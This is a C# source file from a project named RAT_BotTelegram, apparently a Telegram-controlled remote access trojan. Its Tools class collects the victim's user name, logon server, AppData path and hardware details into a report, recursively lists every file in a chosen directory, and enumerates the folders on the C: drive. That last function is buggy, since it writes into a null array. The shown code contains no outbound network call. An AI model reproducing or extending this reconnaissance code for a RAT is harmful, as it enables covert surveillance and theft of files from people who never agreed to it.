using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Threading.Tasks;
using RAT_BotTelegram.Lib;
using System.IO;
using Microsoft.SqlServer.Server;

namespace RAT_BotTelegram.Lib {
    internal sealed class Tools {

        public static String PC_Info() {
            Console.WriteLine(Features.getArchitecture());
            String Info = "Detailed Computer Information" +

                "\n\n*UserData *" +
                "\n - User Name: "+ Features.getUserName() +
                "\n - User Profile: C:\\User\\" + Features.getUserName() +
                "\n - User Domain: " + Features.getUserName() +
                "\n - Logon Server: " + Features.getLogonServer() +
                "\n - AppData: C:\\Users\\" + Features.getUserName() + @"\AppData\Roaming " +
                "\n - Home Path: \\Users\\" + Features.getUserName() +


                "\n\n*Processor *" +
                "\n - Name: " + Features.getProcessorName() +
                "\n - Frequency: " + Features.getProcessorGhz() + " Ghz"+
                "\n - Architecture: " + Features.getArchitecture() +


                "\n\n*Motherboard *"+
                "\n - Name: " + Features.getMotherboardName() +
                "\n - Manufacturer: " + Features.getMotherboardManufacturer() +
                "\n - BIOSVendor: " + Features.getBIOSVendor() +

                "";
            return Info;
        }

        public static string[] GetFile(string dir) {
            // Obtiene Nombre del procesador
            try {

                string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
                return allfiles;
            } catch (Exception e) {
                string[] allfiles = { "[-]" };
                Console.WriteLine("La carpeta no existe: " + e);
                return allfiles;
            } 
        }
        public static string[] GetFolder() {
            // Obtiene Nombre del procesador
            string[] allfiles = null;
            int n = 0;
            try {
                foreach (string folder in Directory.GetDirectories(@"C:\")) {
                    n = n + 1;
                    allfiles[n] = folder;
                    
                    //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
                    //GetDirectoryAll(folder, indent + 2);
                }
            } catch (UnauthorizedAccessException) { 
            }



            return allfiles;
            //try {
            //    string[] allFolder = Directory.GetDirectories(dir);
            //    //string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
            //    return allFolder;
            //} catch (Exception e) {
            //    string[] allfiles = { "[-]" };
            //    Console.WriteLine("La carpeta no existe: " + e);
            //    return allfiles;
            //}
        }
        //    La carpeta no existe: System.UnauthorizedAccessException: Access to the path 'C:\$Recycle.Bin\S-1-5-18' is denied.
        //   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
        //   at System.IO.FileSystemEnumerableIterator`1.AddSearchableDirsToStack(SearchData localSearchData)
        //   at System.IO.FileSystemEnumerableIterator`1.MoveNext()
        //   at System.Collections.Generic.List`1..ctor(IEnumerable`1 collection)
        //   at System.IO.Directory.GetFiles(String path, String searchPattern, SearchOption searchOption)
        //   at RAT_BotTelegram.Lib.Tools.GetFile(String dir) in O:\OneDrive - xKx\SoftwareProyect\C#\[GitHub] RAT_BotTelegram\RAT_BotTelegram\Lib\Tools.cs:line 44
        //La carpeta no existe: System.UnauthorizedAccessException: Access to the path 'O:\$RECYCLE.BIN\S-1-5-21-2583174595-1598790024-4181169623-1001\$RWD0RHE' is denied.
        //   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
        //   at System.IO.FileSystemEnumerableIterator`1.AddSearchableDirsToStack(SearchData localSearchData)
        //   at System.IO.FileSystemEnumerableIterator`1.MoveNext()
        //   at System.Collections.Generic.List`1..ctor(IEnumerable`1 collection)
        //   at System.IO.Directory.GetFiles(String path, String searchPattern, SearchOption searchOption)
        //   at RAT_BotTelegram.Lib.Tools.GetFile(String dir) in O:\OneDrive - xKx\SoftwareProyect\C#\[GitHub] RAT_BotTelegram\RAT_BotTelegram\Lib\Tools.cs:line 44



        

    }
}
